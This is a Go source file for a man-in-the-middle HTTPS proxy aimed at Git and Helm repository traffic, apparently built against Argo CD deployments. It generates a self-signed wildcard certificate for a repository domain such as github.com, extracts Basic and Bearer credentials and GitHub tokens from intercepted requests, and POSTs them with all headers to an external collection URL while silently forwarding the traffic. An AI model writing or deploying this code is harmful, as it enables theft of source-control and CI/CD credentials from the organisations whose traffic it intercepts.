package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"
)

// Generate Certificate and log into the console
func generateCert() (certFile, keyFile string, err error) {
	repo := os.Getenv("REPO_DOMAIN")
	if repo == "" {
		repo = "github.com" // Default to github.com if REPO_DOMAIN is not set
	}

	log.Println("Target repository domain for certificate SAN:", repo)

	priv, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return "", "", err
	}

	serialNumber, err := rand.Int(rand.Reader, big.NewInt(1<<62))
	if err != nil {
		return "", "", err
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			CommonName: "*." + repo,
		},
		DNSNames:  []string{"*." + repo, repo}, // Add SAN
		NotBefore: time.Now(),
		NotAfter:  time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:  x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage: []x509.ExtKeyUsage{
			x509.ExtKeyUsageServerAuth,
		},
		BasicConstraintsValid: true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return "", "", err
	}

	certOut, err := os.Create("cert.pem")
	if err != nil {
		return "", "", err
	}
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	certOut.Close()

	keyOut, err := os.Create("key.pem")
	if err != nil {
		return "", "", err
	}
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	keyOut.Close()

	certBytes, _ := os.ReadFile("cert.pem")
	fmt.Print(string(certBytes))
	return "cert.pem", "key.pem", nil
}

// Extract credentials from the request based on auth type
func extract_credentials(headers map[string][]string, uri string) map[string]string {

	var username, password, token, auth_type, token_type string

	// Check for Basic Auth
	if authHeaders, ok := headers["Authorization"]; ok {
		for _, h := range authHeaders {
			if len(h) > 6 && h[:6] == "Basic " {
				token_type = "Basic"
				decoded, err := io.ReadAll(base64.NewDecoder(base64.StdEncoding, strings.NewReader(h[6:])))
				if err == nil {
					if strings.Contains(string(decoded), ":") {
						parts := strings.SplitN(string(decoded), ":", 2)
						if len(parts) == 2 {
							if strings.Contains(string(decoded), "x-access-token") {
								username = parts[0]
								token = parts[1]
							} else {
								username = parts[0]
								if strings.Contains(parts[1], "ghp_") {
									token = parts[1]
								} else {
									password = parts[1]
								}
							}
						}
					}
				}
			} else if len(h) > 7 && h[:7] == "Bearer " {
				token_type = "Bearer"
				token = h[7:]
			}
		}
	}

	// Check for Auth types
	if strings.Contains(uri, "index.yaml") {
		auth_type = "Helm"
	} else if strings.Contains(uri, "info/refs?service=git-upload-pack") && strings.Contains(username, "x-access-token") {
		auth_type = "Github App"
	} else if strings.Contains(uri, "info/refs?service=git-upload-pack") && token_type == "Bearer" {
		auth_type = "Bitbucket App"
	} else if strings.Contains(uri, "info/refs?service=git-upload-pack") {
		auth_type = "Git"
	}

	creds := make(map[string]string)
	creds["username"] = username
	creds["password"] = password
	creds["token"] = token
	creds["auth_type"] = auth_type
	creds["token_type"] = token_type

	if password != "" || token != "" {
		log.Printf("Extracted credentials: %v", creds)
	}

	return creds
}

// Log to external destination
func LogToDestination(method string, uri string, scheme string, host string, remoteAddr string, headers map[string][]string, targetURL string, creds map[string]string) {

	// Create a request body with the 4 parameters
	body := map[string]interface{}{
		"method":     method,
		"uri":        uri,
		"scheme":     scheme,
		"host":       host,
		"creds":      creds,
		"remoteAddr": remoteAddr,
		"headers":    headers,
	}

	jsonBody, err := json.Marshal(body)
	if err != nil {
		log.Printf("Failed to marshal JSON body: %v", err)
	}

	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		log.Printf("Failed to create HTTP request: %v", err)
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	client.Do(req)
	log.Printf("Logged to external destination: %s", targetURL)

}

// Forward the request to the original destination
func forwardRequest(w http.ResponseWriter, r *http.Request) {
	// Build the target URL using the scheme, host, and request URI
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	targetURL := fmt.Sprintf("%s://%s%s", scheme, r.Host, r.RequestURI)

	// Create a new request to forward
	req, err := http.NewRequest(r.Method, targetURL, r.Body)
	if err != nil {
		http.Error(w, "Failed to create request", http.StatusInternalServerError)
		return
	}

	// Copy headers
	for k, v := range r.Header {
		for _, vv := range v {
			req.Header.Add(k, vv)
		}
	}

	// Use default HTTP client
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		http.Error(w, "Failed to forward request", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	// Copy response headers
	for k, v := range resp.Header {
		for _, vv := range v {
			w.Header().Add(k, vv)
		}
	}
	w.WriteHeader(resp.StatusCode)

	// Copy response body and log it
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Failed to read response body: %v", err)
	}

	modifiedBody := bodyBytes
	w.Write(modifiedBody)
	log.Printf("Headers: %v, Body: %v", resp.Header, string(modifiedBody))

}

// Log to Argocd output
func LogToOutput(method string, uri string, scheme string, host string, remoteAddr string, headers map[string][]string) {
	log.Printf(" RemoteAddr: %s -> Method: %s, scheme: %s, host: %s, uri: %s, Headers: %v", remoteAddr, method, scheme, host, uri, headers)
}

// Handle incoming requests
func requesthandler(w http.ResponseWriter, r *http.Request) {

	headers := make(map[string][]string)
	for k, v := range r.Header {
		headers[k] = v
	}
	method := r.Method
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	host := r.Host
	uri := r.URL.RequestURI()
	remoteAddr := r.RemoteAddr

	// Extract the credentials depending on the auth type
	creds := extract_credentials(headers, uri)

	// Log to external destination and in the output
	targetURL := os.Getenv("TARGET_URL")
	if targetURL != "" {
		LogToDestination(method, uri, scheme, host, remoteAddr, headers, targetURL, creds)
	}
	LogToOutput(method, uri, scheme, host, remoteAddr, headers)

	// Forward the request to the original destination
	forwardRequest(w, r)

}

func main() {
	certFile, keyFile, err := generateCert()
	if err != nil {
		log.Fatalf("Failed to generate cert: %v", err)
	}
	time.Sleep(1 * time.Second)
	http.HandleFunc("/", requesthandler)
	log.Println("Starting HTTPS server on :443")
	log.Fatal(http.ListenAndServeTLS(":443", certFile, keyFile, nil))
}
